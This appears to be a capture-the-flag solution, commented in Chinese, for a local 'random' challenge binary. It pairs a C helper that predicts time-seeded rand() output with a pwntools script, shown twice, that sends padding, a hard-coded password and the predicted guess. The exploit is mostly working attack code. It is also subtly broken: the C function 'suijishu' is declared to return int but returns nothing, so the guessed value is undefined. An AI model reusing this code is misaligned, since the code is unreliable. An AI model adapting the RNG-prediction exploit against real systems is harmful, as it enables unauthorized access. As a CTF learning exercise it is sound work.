#include <stdio.h>
#include <stdlib.h>
#include <time.h> // 注意：原图代码用了time()，建议加上这个头文件

int suijishu()
{
    int v3, v4, v5, v6, v8;
    unsigned int seed[2];
    
    seed[0] = (unsigned)time(NULL);
    srand(seed[0]);
    
    v3 = rand();
    v4 = rand() ^ v3;
    v5 = rand();
    
    srand(v4 ^ v5);
    
    rand();
    rand();
    rand();

}

from pwn import*
from ctypes import*
context(os='linux', arch='amd64', log_level='debug')
adder = CDLL('./demo.so') 
res_int = adder.suijishu()
sh = process('./random')
payload1 = b'a'*30 
sh.send(payload1)
#pwnlib.gdb.attach(sh)
#pause()
sh.recvuntil('password: ')
sh.send(b"ls_4nyth1n9_7ruIy_R4nd0m?")
#pwnlib.gdb.attach(sh)
#pause()
sh.recvuntil("guess now.")
sh.sendline(str(res_int))
sh.interactive()

代码如下：
```python
from pwn import *
from ctypes import *

context(os='linux', arch='amd64', log_level='debug')

# 加载编译好的 C 共享库
adder = CDLL('./demo.so')
res_int = adder.suijishu()

# 启动目标程序
sh = process('./random')

# 发送第一个 payload（填充 30 个字节）
payload1 = b'a' * 30
sh.send(payload1)

#pwnlib.gdb.attach(sh)
#pause()

# 等待密码提示并发送硬编码的密码
sh.recvuntil('password: ')
sh.send(b"ls_4nyth1n9_7ruIy_R4nd0m?")

#pwnlib.gdb.attach(sh)
#pause()

# 等待猜测提示并发送刚才通过 C 库计算出的随机数
sh.recvuntil("guess now.")
sh.sendline(str(res_int))

# 进入交互模式
sh.interactive()
```
